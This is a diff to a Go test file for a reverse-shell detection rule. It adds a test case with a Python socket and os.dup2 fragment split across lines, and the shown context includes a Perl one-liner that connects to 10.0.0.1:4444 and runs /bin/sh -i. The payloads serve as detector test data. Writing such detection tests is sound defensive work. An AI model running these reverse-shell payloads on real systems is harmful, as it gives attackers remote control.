@@ -66,6 +66,15 @@ func TestReverseShellRule(t *testing.T) {
 			wantSD025: true,
 		},
 		{
+			name: "python socket.socket() call split across newline (PAIR line-number fallback)",
+			content: "s = socket.socket\n" +
+				"    (socket.AF_INET, socket.SOCK_STREAM)\n" +
+				"os.dup2(s.fileno(), 0)\n",
+			ext:       ".py",
+			path:      "SKILL.md",
+			wantSD025: true,
+		},
+		{
 			name: "perl Socket+exec",
 			content: `use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));` +
 				`connect(S,sockaddr_in(4444,inet_aton("10.0.0.1")));exec "/bin/sh -i";`,
